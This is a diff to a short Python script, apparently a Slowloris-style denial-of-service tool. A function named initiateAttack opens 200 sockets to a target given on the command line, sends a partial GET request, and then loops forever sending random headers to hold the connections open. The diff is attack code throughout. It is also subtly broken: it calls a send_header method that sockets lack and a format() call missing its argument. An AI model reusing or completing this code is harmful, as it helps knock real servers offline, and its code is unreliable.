@@ -1,5 +1,6 @@
 import sys
 import socket
+import random
 
 STANDARD_GET_REQUEST = "GET / HTTP/1.1"
 SOCKET_CONNECTIONS = []
@@ -9,16 +10,18 @@ def create_connection(ip, port):
     s.connect((ip, port))
     SOCKET_CONNECTIONS.append(s)
     s.send(str.encode(STANDARD_GET_REQUEST))
-        
-
-
 
 def initiateAttack(ip, port):
     for _ in range(200):
         create_connection(ip, port)
     
-    for connection in SOCKET_CONNECTIONS:
-        print(connection)
+    while True:
+        for connection in SOCKET_CONNECTIONS:
+            try:
+                connection.send_header("X-a", random.randint(1,2000))
+            except socket.error:
+                SOCKET_CONNECTIONS.remove(connection)
+        print("Socket Count: {0}".format())
 
 def main():
     ip = sys.argv[1]
